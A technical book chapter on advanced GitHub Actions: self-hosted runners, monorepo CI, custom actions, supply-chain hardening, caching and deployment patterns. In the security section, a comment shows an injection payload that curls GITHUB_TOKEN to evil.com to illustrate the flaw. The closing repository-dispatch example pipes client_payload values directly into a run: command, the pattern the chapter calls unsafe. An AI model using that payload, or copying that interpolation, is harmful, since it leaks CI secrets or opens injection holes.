<!--
  CHAPTER: 33b
  TITLE: Advanced GitHub Actions
  PART: III — Tooling & Practice
  PREREQS: Ch 33 (GitHub Actions Core), Ch 7 (DevOps), Ch 15 (Codebase Organization), Ch 5 (Security)
  KEY_TOPICS: Self-hosted runners, monorepo CI patterns, custom actions, security hardening, performance optimization, advanced workflow patterns, debugging, enterprise CI/CD pipelines
  DIFFICULTY: Advanced
  UPDATED: 2026-03-24
-->

# Chapter 33b: Advanced GitHub Actions

> **Part III — Tooling & Practice** | Prerequisites: Ch 33 (GitHub Actions Core), Ch 7, Ch 15, Ch 5 | Difficulty: Advanced

Chapter 33 covered the foundational building blocks of GitHub Actions — workflow syntax, reusable workflows, composite actions, matrix strategies, and OIDC federation. This chapter takes those foundations and applies them to the problems that emerge at scale: self-hosted runners for cost and network access, monorepo CI that only tests what changed, custom actions that encapsulate your team's domain logic, security hardening against supply chain attacks, performance optimization that turns 15-minute pipelines into 3-minute ones, and the advanced patterns that tie it all together into a production-grade delivery system.

### In This Chapter
- Self-Hosted Runners
- Monorepo CI Patterns
- Building Custom Actions
- Security Hardening
- Performance Optimization
- Advanced Patterns
- Debugging and Troubleshooting
- The 100x CI/CD Pipeline

### Related Chapters
- Chapter 33 — GitHub Actions Core: workflow syntax, reusable workflows, composite actions, matrix strategies, OIDC federation
- Chapter 7 — DevOps fundamentals and CI/CD concepts
- Chapter 8 — Testing strategies that CI enforces
- Chapter 15 — Codebase organization, linting, basic CI/CD pipeline setup
- Chapter 5 — Security principles (applied here to supply chain)
- Chapter 19 — AWS infrastructure (OIDC federation target)
- Chapter 12 — Git workflows and tooling

---

## 7. SELF-HOSTED RUNNERS

### 7.1 When to Use Self-Hosted Runners

GitHub-hosted runners are excellent for most workloads — they are maintained, ephemeral, and require zero infrastructure overhead. Use self-hosted when:

- **Private network access:** You need to reach databases/services behind a VPN or private subnet.
- **GPU workloads:** ML model training, CUDA builds.
- **Custom hardware:** ARM builds, specific OS versions, hardware security modules.
- **Cost at scale:** At ~50+ concurrent runners, self-hosted becomes cheaper.
- **Build speed:** Persistent caches, pre-installed dependencies, larger machines.

If none of these apply to you, stick with GitHub-hosted. Self-hosted runners are infrastructure you now own and must maintain.

### 7.2 Ephemeral Runners

Always use ephemeral runners. A non-ephemeral runner retains state between jobs — cached credentials, modified filesystems, compromised dependencies from previous runs. One malicious job can poison every subsequent job that runs on the same machine.

```bash
# Register an ephemeral runner (one job, then exit)
./config.sh --url https://github.com/org/repo \
  --token TOKEN \
  --ephemeral \
  --labels self-hosted,linux,x64,gpu \
  --name "runner-$(hostname)-$$"
```

The runner executes one job and exits. Your orchestration layer (Kubernetes, ASG, etc.) creates a new one. Clean machine every time.

### 7.3 Actions Runner Controller (ARC) on Kubernetes

ARC is the standard way to run auto-scaling ephemeral runners on Kubernetes. It watches the GitHub Actions queue and spins up runners on demand, then terminates them after each job.

```yaml
# helm values for actions-runner-controller
githubConfigUrl: "https://github.com/my-org"
githubConfigSecret:
  github_app_id: "12345"
  github_app_installation_id: "67890"
  github_app_private_key: |
    -----BEGIN RSA PRIVATE KEY-----
    ...
    -----END RSA PRIVATE KEY-----

maxRunners: 20
minRunners: 2

template:
  spec:
    containers:
      - name: runner
        image: ghcr.io/actions/actions-runner:latest
        resources:
          requests:
            cpu: "2"
            memory: "4Gi"
          limits:
            cpu: "4"
            memory: "8Gi"
        volumeMounts:
          - name: work
            mountPath: /home/runner/_work
    volumes:
      - name: work
        emptyDir: {}
```

```bash
helm install arc \
  --namespace arc-systems \
  --create-namespace \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set-controller

helm install arc-runner-set \
  --namespace arc-runners \
  --create-namespace \
  -f values.yml \
  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set
```

### 7.4 Runner Groups and Labels

```yaml
# Use self-hosted runners with specific labels
jobs:
  build:
    runs-on: [self-hosted, linux, x64, gpu]
    steps:
      - run: nvidia-smi  # GPU available
```

Organize runners into groups in your GitHub org settings. Assign groups to specific repos — prevent untrusted repos from running on sensitive runners. A runner that has production network access should not be available to every experimental project in your org.

### 7.5 Security Warning

**Never use self-hosted runners on public repositories.** Anyone can open a PR to a public repo. If that PR triggers a workflow on your self-hosted runner, the PR author can execute arbitrary code on your infrastructure. This is not a theoretical risk — it is actively exploited in the wild.

For public repos, always use GitHub-hosted runners.

### 7.6 Cost Comparison

| Scale | GitHub-Hosted (Linux) | Self-Hosted (AWS) | Notes |
|-------|----------------------|-------------------|-------|
| 10 jobs/day, 5 min each | ~$2.40/month | ~$35/month (t3.medium always-on) | GitHub-hosted wins at low scale |
| 100 jobs/day, 5 min each | ~$24/month | ~$35/month (t3.medium) + ARC overhead | Break-even zone |
| 500 jobs/day, 10 min each | ~$240/month | ~$70/month (c6i.xlarge spot) | Self-hosted wins at scale |
| 2000 jobs/day, 10 min each | ~$960/month | ~$200/month (ARC on EKS, spot) | Self-hosted is 5x cheaper |

**The crossover point** is roughly 50-100 concurrent runner-minutes per day. Below that, GitHub-hosted is simpler and cheaper. Above that, self-hosted pays for itself. And if your builds need persistent Docker layer caches or pre-warmed dependency installations, the speed improvement often justifies the switch even before the cost crossover.

---

## 8. MONOREPO CI PATTERNS

### 8.1 The Challenge: Running Everything When You Changed Nothing Relevant

In a monorepo with `apps/web`, `apps/api`, `packages/shared`, and `packages/ui`, a naively configured CI runs everything on every PR. The frontend engineer who fixed a typo in a button label waits eight minutes for the entire backend integration test suite. The backend engineer who added a database index watches the Playwright E2E tests grind through 200 UI scenarios.

This is not just slow — it erodes trust in CI. When CI takes 12 minutes and half of that is testing code you did not touch, engineers start ignoring CI results. They merge without waiting. They cherry-pick test runs. The pipeline that was supposed to be the safety net becomes the obstacle that people route around.

The monorepo CI patterns in this section are specifically designed to prevent that. As Ch 15 §3 establishes, a well-organized codebase structure is prerequisite to a well-organized CI system.

### 8.2 Path Filtering (Native)

The simplest approach — separate workflows per area, each with explicit path filters:

```yaml
# .github/workflows/api-ci.yml
name: API CI
on:
  pull_request:
    paths:
      - 'apps/api/**'
      - 'packages/shared/**'
      - 'packages/database/**'
      - '.github/workflows/api-ci.yml'
```

```yaml
# .github/workflows/web-ci.yml
name: Web CI
on:
  pull_request:
    paths:
      - 'apps/web/**'
      - 'packages/shared/**'
      - 'packages/ui/**'
      - '.github/workflows/web-ci.yml'
```

**Limitation:** Path filtering is static. If `packages/shared` changes, both workflows run — even if the change only affects API consumers. For smarter detection, you need a change detection tool.

### 8.3 Change Detection with dorny/paths-filter

```yaml
name: CI

on:
  pull_request:
    branches: [main]

jobs:
  detect-changes:
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
      shared: ${{ steps.filter.outputs.shared }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api:
              - 'apps/api/**'
              - 'packages/database/**'
            web:
              - 'apps/web/**'
              - 'packages/ui/**'
            shared:
              - 'packages/shared/**'

  api-tests:
    needs: detect-changes
    if: needs.detect-changes.outputs.api == 'true' || needs.detect-changes.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test --workspace=apps/api

  web-tests:
    needs: detect-changes
    if: needs.detect-changes.outputs.web == 'true' || needs.detect-changes.outputs.shared == 'true'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test --workspace=apps/web
```

Now a change to `packages/shared` runs both, but a change to only `apps/web` skips API tests entirely. The CSS typo fix gets a 90-second CI run instead of an 8-minute one.

### 8.4 Turborepo Integration

Turborepo has built-in affected package detection that goes a layer deeper than file paths — it understands the dependency graph of your packages.

```yaml
name: CI

on:
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Needed for comparison

      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: 'npm'

      - run: npm ci

      - name: Run affected tests
        run: npx turbo run test --filter='...[origin/main...HEAD]'
        # Only runs test for packages that changed since main
```

The `--filter='...[origin/main...HEAD]'` syntax tells Turborepo to only run tasks for packages that changed (and their dependents) compared to the main branch. If `packages/shared` changed and `apps/api` depends on it, both get tested — automatically, without you having to hardcode that relationship in your workflow.

### 8.5 Nx Affected

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: nrwl/nx-set-shas@v4
        # Sets NX_BASE and NX_HEAD env vars

      - run: npm ci

      - run: npx nx affected -t test --parallel=3
      - run: npx nx affected -t lint --parallel=3
      - run: npx nx affected -t build --parallel=3
```

### 8.6 Shared Setup with Composite Actions

Avoid repeating setup across monorepo workflows. Every job that runs in your monorepo needs roughly the same boot sequence — checkout, Node setup, npm install, cache config. Extract that into a composite action:

```yaml
# .github/actions/monorepo-setup/action.yml
name: 'Monorepo Setup'
description: 'Standard setup for all monorepo CI jobs'

inputs:
  node_version:
    default: '22'
  turbo_token:
    description: 'Turborepo remote cache token'
    required: false

runs:
  using: 'composite'
  steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 0

    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node_version }}
        cache: 'npm'

    - name: Turbo cache
      uses: actions/cache@v4
      with:
        path: .turbo
        key: turbo-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-${{ github.sha }}
        restore-keys: |
          turbo-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}-
          turbo-${{ runner.os }}-

    - shell: bash
      run: npm ci

    - name: Configure Turbo remote cache
      if: inputs.turbo_token != ''
      shell: bash
      env:
        TURBO_TOKEN: ${{ inputs.turbo_token }}
        TURBO_TEAM: ${{ github.repository_owner }}
      run: echo "Turbo remote cache configured"
```

Every workflow in the monorepo starts with:

```yaml
steps:
  - uses: ./.github/actions/monorepo-setup
    with:
      turbo_token: ${{ secrets.TURBO_TOKEN }}
```

One setup. Every workflow. Update it once, and every workflow gets the update.

---

## 9. BUILDING CUSTOM ACTIONS

### 9.1 When to Build Custom

The marketplace has thousands of actions. Before building your own, search it. But build a custom action when:
- You repeat the same multi-step logic across many workflows.
- You need to interact with the GitHub API in a specific way.
- No existing marketplace action does what you need.
- You want to encapsulate domain-specific logic (e.g., "post test results as PR comment with specific formatting").

A good custom action is invisible infrastructure. Engineers in your org use it without knowing it exists, and their pull requests automatically get rich, formatted test result comments. That is the goal.

### 9.2 JavaScript Actions

JavaScript actions run directly in the Node.js runtime on the runner. They are the fastest to start (no Docker pull) and the easiest to develop and test.

```
my-action/
  action.yml
  index.js
  package.json
  node_modules/   # Must be committed (or use ncc to bundle)
```

**action.yml:**

```yaml
name: 'Post Test Results'
description: 'Posts test results as a PR comment with pass/fail summary'
inputs:
  test_results_path:
    description: 'Path to test results JSON'
    required: true
  github_token:
    description: 'GitHub token for posting comments'
    required: true
runs:
  using: 'node20'
  main: 'dist/index.js'
```

**index.js (using @actions/core and @actions/github):**

```javascript
const core = require('@actions/core');
const github = require('@actions/github');
const fs = require('fs');

async function run() {
  try {
    const resultsPath = core.getInput('test_results_path', { required: true });
    const token = core.getInput('github_token', { required: true });

    // Read test results
    const results = JSON.parse(fs.readFileSync(resultsPath, 'utf8'));

    // Format the comment
    const passed = results.numPassedTests;
    const failed = results.numFailedTests;
    const total = results.numTotalTests;
    const duration = (results.testResults
      .reduce((acc, r) => acc + r.perfStats.runtime, 0) / 1000).toFixed(1);

    const status = failed > 0 ? '❌' : '✅';
    const body = [
      `## ${status} Test Results`,
      '',
      `| Metric | Value |`,
      `|--------|-------|`,
      `| Passed | ${passed} |`,
      `| Failed | ${failed} |`,
      `| Total  | ${total} |`,
      `| Duration | ${duration}s |`,
      '',
      failed > 0 ? '### Failed Tests' : '',
      ...results.testResults
        .filter(r => r.status === 'failed')
        .map(r => `- \`${r.name}\`: ${r.message}`),
    ].join('\n');

    // Post as PR comment
    const octokit = github.getOctokit(token);
    const { context } = github;

    if (context.payload.pull_request) {
      await octokit.rest.issues.createComment({
        owner: context.repo.owner,
        repo: context.repo.repo,
        issue_number: context.payload.pull_request.number,
        body,
      });
      core.info(`Posted test results to PR #${context.payload.pull_request.number}`);
    }

    // Set outputs
    core.setOutput('passed', passed);
    core.setOutput('failed', failed);

    // Fail the action if tests failed
    if (failed > 0) {
      core.setFailed(`${failed} test(s) failed`);
    }
  } catch (error) {
    core.setFailed(`Action failed: ${error.message}`);
  }
}

run();
```

**Bundle with ncc** to avoid committing `node_modules`:

```bash
npm install -D @vercel/ncc
npx ncc build index.js -o dist
# Commit dist/index.js instead of node_modules/
```

### 9.3 Docker Container Actions

When you need tools not available in Node.js, or want a fully isolated environment:

```yaml
# action.yml
name: 'Security Scan'
description: 'Run security scan with custom tooling'
inputs:
  scan_path:
    description: 'Path to scan'
    default: '.'
runs:
  using: 'docker'
  image: 'Dockerfile'
  args:
    - ${{ inputs.scan_path }}
```

```dockerfile
FROM python:3.12-slim
RUN pip install bandit safety
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
```

```bash
#!/bin/bash
# entrypoint.sh
SCAN_PATH="${1:-.}"
echo "::group::Running Bandit security scan"
bandit -r "$SCAN_PATH" -f json -o /tmp/bandit.json || true
echo "::endgroup::"

# Parse results and set output
ISSUES=$(jq '.results | length' /tmp/bandit.json)
echo "issues=$ISSUES" >> "$GITHUB_OUTPUT"

if [ "$ISSUES" -gt 0 ]; then
  echo "::warning::Found $ISSUES security issues"
  jq -r '.results[] | "::warning file=\(.filename),line=\(.line_number)::\(.issue_text)"' /tmp/bandit.json
fi
```

Docker actions are slower to start (image build/pull) but give you complete control over the runtime.

### 9.4 Testing Custom Actions Locally

Use **act** to test actions locally without pushing to GitHub:

```bash
# Install act
brew install act

# Run a specific workflow
act pull_request -W .github/workflows/ci.yml

# Run a specific job
act -j test

# Pass secrets
act -s GITHUB_TOKEN="$(gh auth token)"

# Use a specific runner image
act -P ubuntu-latest=catthehacker/ubuntu:act-latest
```

**Caveat:** `act` cannot perfectly replicate GitHub-hosted runners. Service containers, OIDC, and some API calls will not work. Use it for fast iteration on workflow logic, not as a replacement for real CI runs. The feedback loop is: `act` for syntax and logic, real GitHub runs for final validation.

### 9.5 Versioning Actions

**For consumers:** Pin by full SHA for security, or by major version tag for convenience:

```yaml
# Most secure: pin by SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

# Convenient: pin by major version tag
- uses: actions/checkout@v4

# Dangerous: pin by branch (can change at any time)
- uses: actions/checkout@main  # Don't do this
```

**For maintainers:** Follow semantic versioning. Update the major version tag on each release:

```bash
# Release v2.3.0
git tag v2.3.0
git push origin v2.3.0

# Move the v2 floating tag
git tag -d v2
git push origin :refs/tags/v2
git tag v2
git push origin v2
```

---

## 10. SECURITY HARDENING

### 10.1 The Supply Chain Attack Surface

Your CI pipeline is a program. It downloads code from the internet and executes it with access to your production credentials. Stop and sit with that for a moment.

Every `uses: some-action@v3` is a dependency. If that action is compromised — whether through a hacked maintainer account, a typosquatted name, or a malicious update — it runs with everything your workflow can access. In 2023, several popular GitHub Actions were compromised through exactly this vector. The attack surface is real.

### 10.2 Pin Actions by SHA

Tags are mutable. Anyone with push access to a repo can move a tag to point at malicious code. If you use `actions/checkout@v4` and the `actions` org is compromised, your workflow runs the attacker's code.

Pin by full SHA:

```yaml
steps:
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
  - uses: actions/cache@1bd1e32a3bdc45362d1e726936510720a7c30a57    # v4.2.0
```

**Always add a comment with the version** so humans can read it. Dependabot and Renovate can auto-update SHA pins — you get security without the maintenance burden of manually tracking versions.

### 10.3 Dependabot for Action Updates

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    commit-message:
      prefix: "ci"
    labels:
      - "dependencies"
      - "ci"
```

Dependabot will open PRs when action versions update, including SHA pin updates. You stay current without watching every action repo you depend on.

### 10.4 CODEOWNERS for CI Files

Prevent unauthorized changes to workflow files. Your CI configuration is infrastructure — it should require the same review rigor as your Terraform or Kubernetes manifests.

```
# .github/CODEOWNERS
.github/workflows/    @org/platform-team
.github/actions/      @org/platform-team
.github/dependabot.yml @org/platform-team
```

Require CODEOWNERS approval in branch protection rules. Now nobody can modify CI without platform team review. An engineer who wants to "just add a quick echo" to a deploy workflow cannot do it without a sign-off from someone who understands what they are changing.

### 10.5 Minimal GITHUB_TOKEN Permissions

Start with zero and add what you need:

```yaml
# Top level: no permissions by default
permissions: {}

jobs:
  test:
    permissions:
      contents: read
    # ...

  deploy:
    permissions:
      contents: read
      id-token: write   # OIDC
    # ...

  comment:
    permissions:
      pull-requests: write
    # ...
```

### 10.6 Environment Protection Rules

For production deployments, configure GitHub Environments. This is where you enforce the human gate in an otherwise automated pipeline:

1. **Required reviewers:** 1-6 people must approve before the job runs.
2. **Wait timer:** Configurable delay (e.g., 5 minutes) before deployment starts.
3. **Branch restrictions:** Only `main` (or `release/*`) can deploy to production.
4. **Environment-specific secrets:** Production secrets are only available to production-environment jobs.

```yaml
jobs:
  deploy-staging:
    environment: staging
    runs-on: ubuntu-latest
    steps:
      - run: deploy --env staging

  deploy-production:
    needs: deploy-staging
    environment:
      name: production
      url: https://app.example.com
    runs-on: ubuntu-latest
    steps:
      - run: deploy --env production
```

### 10.7 Supply Chain Attack Vectors

Understand exactly what you are defending against:

| Attack Vector | Risk | Mitigation |
|--------------|------|------------|
| Compromised action tag | Attacker moves tag to malicious code | Pin by SHA |
| Typosquatting | `actions/checkout` vs `action/checkout` | Review action sources carefully |
| Dependency confusion | Action pulls malicious npm package | Use lockfiles, verify checksums |
| Fork PR injection | PR from fork runs code on your runner | Use `pull_request` (not `pull_request_target`) for untrusted code |
| Secrets exfiltration | Workflow leaks secrets to logs or external URLs | Mask secrets, audit workflow changes |
| Script injection | `${{ github.event.issue.title }}` in `run:` | Never interpolate user input into `run:`, use env vars instead |

**Script injection is the most common vulnerability**, and the most preventable:

```yaml
# VULNERABLE: user-controlled input directly in run command
- run: echo "Issue title: ${{ github.event.issue.title }}"
  # An attacker can set the title to: " && curl evil.com/steal?token=$GITHUB_TOKEN

# SAFE: use environment variables
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Issue title: $TITLE"
  # Shell variable expansion prevents injection
```

The rule is absolute: never interpolate `github.event.*` or any other user-supplied data directly into a `run:` command. Always pass through an environment variable.

### 10.8 OpenSSF Scorecard and StepSecurity

**Scorecard** audits your repo's security posture against a set of best practices — pinned actions, code review requirements, vulnerability scanning, and more:

```yaml
- uses: ossf/scorecard-action@v2
  with:
    results_file: results.sarif
    results_format: sarif
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: results.sarif
```

**StepSecurity Harden-Runner** monitors network and file access during workflow execution, catching unexpected outbound connections before they become incidents:

```yaml
steps:
  - uses: step-security/harden-runner@v2
    with:
      egress-policy: audit  # Start with audit, then move to block
      allowed-endpoints: >
        api.github.com:443
        registry.npmjs.org:443
        nodejs.org:443

  - uses: actions/checkout@v4
  - run: npm ci
  - run: npm test
```

In `block` mode, any network request to a non-allowlisted endpoint fails immediately. This prevents exfiltration of secrets — the single most valuable thing an attacker gets from a compromised workflow.

---

## 11. PERFORMANCE OPTIMIZATION

### 11.1 The Feedback Loop Is the Product

Your CI pipeline is not just a correctness gate. It is the feedback mechanism that tells engineers whether their code is right. A pipeline that takes 15 minutes is a pipeline that engineers stop reading. They multitask while they wait. They lose context. They merge and hope.

A pipeline that takes 3 minutes is one that engineers actually watch. They see the failure, understand it immediately, fix it without losing their train of thought, and push again. The quality of their code goes up. Their velocity goes up. The pipeline pays for itself.

Every minute you shave off CI is a real productivity win, compounded across your entire team, every working day.

### 11.2 Caching Strategies

Caching is the highest-impact optimization. A typical `npm ci` takes 30-90 seconds. A cache hit reduces it to 2-5 seconds.

**Built-in caching with setup-node:**

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: 22
    cache: 'npm'  # Also supports 'yarn', 'pnpm'
```

This caches the npm global cache directory. `npm ci` still runs (to create `node_modules`), but it reads from local cache instead of the network.

**Explicit caching with actions/cache:**

```yaml
- uses: actions/cache@v4
  id: npm-cache
  with:
    path: node_modules
    key: node-modules-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
    restore-keys: |
      node-modules-${{ runner.os }}-

- name: Install dependencies
  if: steps.npm-cache.outputs.cache-hit != 'true'
  run: npm ci
```

This caches `node_modules` directly — skipping `npm ci` entirely on cache hit. Faster, but requires discipline around lockfile hygiene (if the lockfile hash changes, the cache invalidates correctly; if it doesn't change but deps changed somehow, you get a stale cache).

**Docker layer caching:**

```yaml
- uses: docker/build-push-action@v6
  with:
    context: .
    push: true
    tags: myapp:latest
    cache-from: type=gha
    cache-to: type=gha,mode=max
```

The `type=gha` cache backend uses GitHub Actions' cache infrastructure. `mode=max` caches all layers, not just the final image. For a Dockerfile with many layers, this turns a 4-minute image build into a 20-second one on cache hit.

**Cache limits:**
- Each repo has 10 GB of cache storage.
- Caches not accessed in 7 days are evicted.
- When the limit is reached, oldest caches are evicted first.

### 11.3 Artifact Management

Pass data between jobs (which run on different runners):

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build

      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
          retention-days: 1    # Don't waste storage

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: build-output
          path: dist/

      - run: deploy ./dist
```

**Key points:**
- Artifacts are uploaded/downloaded via GitHub's API. Large artifacts are slow.
- Set `retention-days` to the minimum needed. Default is 90 days.
- For large artifacts (>500MB), consider using a cache key instead.
- Artifacts v4 (`upload-artifact@v4`) supports immutable artifacts and concurrent uploads.

### 11.4 Concurrency Groups

Prevent redundant runs when pushing rapidly. This is a small change with a surprisingly large impact on cost:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

If you push to a PR branch three times in quick succession, only the latest push runs. The first two are cancelled. For a team that pushes frequently, this alone can cut runner minutes by 30-40%.

**Per-environment concurrency** (prevent concurrent deploys):

```yaml
concurrency:
  group: deploy-production
  cancel-in-progress: false  # Don't cancel in-progress deploys
```

You never want two simultaneous deploys to production. This ensures they queue instead of racing.

### 11.5 Reducing Checkout Overhead

The default `actions/checkout` clones the full repo history. For large repos with years of commits, this is measurably slow.

```yaml
# Shallow clone (latest commit only)
- uses: actions/checkout@v4
  with:
    fetch-depth: 1    # Default is 1, but explicit is clear

# Sparse checkout (only specific directories)
- uses: actions/checkout@v4
  with:
    sparse-checkout: |
      apps/api
      packages/shared
    sparse-checkout-cone-mode: true
```

**Sparse checkout** is powerful for large monorepos. If you only need `apps/api` and `packages/shared`, why clone `apps/web`, `apps/mobile`, and 50 other directories? Each unnecessary directory is bandwidth spent and time wasted on every single CI run.

### 11.6 Timeouts

Always set timeouts. A hung test — waiting for a port that never opened, a database connection that timed out silently, a mock server that crashed — can burn runner minutes for 6 hours (the default GitHub timeout):

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15    # Kill if not done in 15 minutes
    steps:
      - run: npm test
        timeout-minutes: 10  # Step-level timeout
```

Set your timeout to 2x your expected runtime. If tests normally take 5 minutes, set 10. The goal is to catch hangs without cutting off legitimate slow runs.

### 11.7 Larger Runners

GitHub offers larger runners for teams and enterprise:

| Runner | vCPUs | RAM | Storage | Price/min |
|--------|-------|-----|---------|-----------|
| ubuntu-latest | 4 | 16 GB | 14 GB SSD | $0.008 |
| ubuntu-latest-4-cores | 4 | 16 GB | 150 GB SSD | $0.016 |
| ubuntu-latest-8-cores | 8 | 32 GB | 300 GB SSD | $0.032 |
| ubuntu-latest-16-cores | 16 | 64 GB | 600 GB SSD | $0.064 |
| ubuntu-latest-32-cores | 32 | 128 GB | 2 TB SSD | $0.128 |
| ubuntu-latest-64-cores | 64 | 256 GB | 2 TB SSD | $0.256 |

A build that takes 20 minutes on a 4-core runner might take 6 minutes on a 16-core runner. At $0.064/min, the 16-core run costs $0.38 vs $0.16 on 4-core — but you get results 14 minutes sooner. For PR feedback loops, the time savings vastly outweigh the cost difference. Engineer time is expensive; runner minutes are cheap.

### 11.8 Measuring CI Performance

You cannot improve what you do not measure. Use the GitHub CLI to track workflow run durations over time:

```bash
# List recent workflow runs with duration
gh run list --workflow ci.yml --limit 20 --json databaseId,conclusion,createdAt,updatedAt \
  | jq '.[] | {id: .databaseId, conclusion: .conclusion,
    duration_seconds: (((.updatedAt | fromdateiso8601) - (.createdAt | fromdateiso8601)))} '

# Average duration of successful runs in the last 7 days
gh run list --workflow ci.yml --limit 50 --status success \
  --json createdAt,updatedAt \
  | jq '[.[] | ((.updatedAt | fromdateiso8601) - (.createdAt | fromdateiso8601))] | add / length | . / 60 | round'
# Outputs average minutes
```

Track this metric weekly. If CI duration trends upward, investigate before it becomes a team-wide bottleneck. CI duration is a leading indicator of developer velocity — when it degrades, everything else degrades with it.

---

## 12. ADVANCED PATTERNS

### 12.1 Deployment Environments with Protection Rules

The deploy-to-staging-first, gate-on-production pattern is how mature teams ship with confidence. Every merge triggers an automatic staging deployment. Production requires a human decision.

```yaml
name: Deploy

on:
  push:
    branches: [main]

jobs:
  deploy-staging:
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/staging-deploy
          aws-region: us-east-1
      - run: ./scripts/deploy.sh staging

  integration-tests:
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm run test:integration -- --base-url=https://staging.example.com

  deploy-production:
    needs: integration-tests
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/production-deploy
          aws-region: us-east-1
      - run: ./scripts/deploy.sh production
```

The `production` environment has required reviewers configured in GitHub. The workflow pauses at `deploy-production` until someone approves. Merging to main is boring. Production deployments are deliberate. That is the goal.

### 12.2 Workflow Dispatch with Custom Inputs

Deploy any branch to any environment, on demand — the escape hatch that teams need for hotfixes and emergency rollbacks:

```yaml
name: Manual Deploy

on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: choice
        options:
          - staging
          - production
      ref:
        description: 'Branch or tag to deploy'
        required: true
        default: 'main'
      skip_tests:
        description: 'Skip pre-deploy tests'
        type: boolean
        default: false

jobs:
  validate:
    if: inputs.skip_tests == false
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.ref }}
      - run: npm ci && npm test

  deploy:
    needs: validate
    if: always() && (needs.validate.result == 'success' || inputs.skip_tests)
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ inputs.ref }}
      - run: ./scripts/deploy.sh ${{ inputs.environment }}
```

### 12.3 Scheduled Workflows

Not everything should be triggered by code changes. Weekly dependency audits, stale branch cleanup, and synthetic monitoring are all good candidates for scheduled workflows.

```yaml
name: Maintenance

on:
  schedule:
    - cron: '0 9 * * 1'  # Monday 9 AM UTC

jobs:
  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm audit --production
      - name: Check for critical vulnerabilities
        run: |
          CRITICAL=$(npm audit --json 2>/dev/null | jq '.metadata.vulnerabilities.critical // 0')
          if [ "$CRITICAL" -gt 0 ]; then
            echo "::error::Found $CRITICAL critical vulnerabilities"
            exit 1
          fi

  stale-branches:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Find stale branches
        run: |
          echo "## Branches with no commits in 30+ days" >> "$GITHUB_STEP_SUMMARY"
          echo "" >> "$GITHUB_STEP_SUMMARY"
          git for-each-ref --sort=committerdate refs/remotes/origin \
            --format='%(committerdate:short) %(refname:short)' \
            | while read date branch; do
                if [[ "$(date -d "$date" +%s 2>/dev/null || date -jf '%Y-%m-%d' "$date" +%s)" -lt "$(date -d '30 days ago' +%s 2>/dev/null || date -v-30d +%s)" ]]; then
                  echo "- \`$branch\` (last commit: $date)" >> "$GITHUB_STEP_SUMMARY"
                fi
              done
```

**Caveat:** Scheduled workflows run on the default branch only. If the workflow file is not on the default branch, the schedule will not trigger.

### 12.4 Repository Dispatch (Cross-Repo Triggering)

In a microservices architecture, you sometimes need one repo's CI to trigger another's tests. Repository dispatch is the mechanism for that.

**Sender (in repo A):**

```yaml
- name: Trigger integration tests in repo B
  uses: peter-evans/repository-dispatch@v3
  with:
    token: ${{ secrets.PAT_TOKEN }}  # Needs repo scope
    repository: org/repo-b
    event-type: run-integration-tests
    client-payload: '{"ref": "${{ github.sha }}", "service": "api"}'
```

**Receiver (in repo B):**

```yaml
on:
  repository_dispatch:
    types: [run-integration-tests]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          echo "Triggered by: ${{ github.event.client_payload.service }}"
          echo "Source ref: ${{ github.event.client_payload.ref }}"
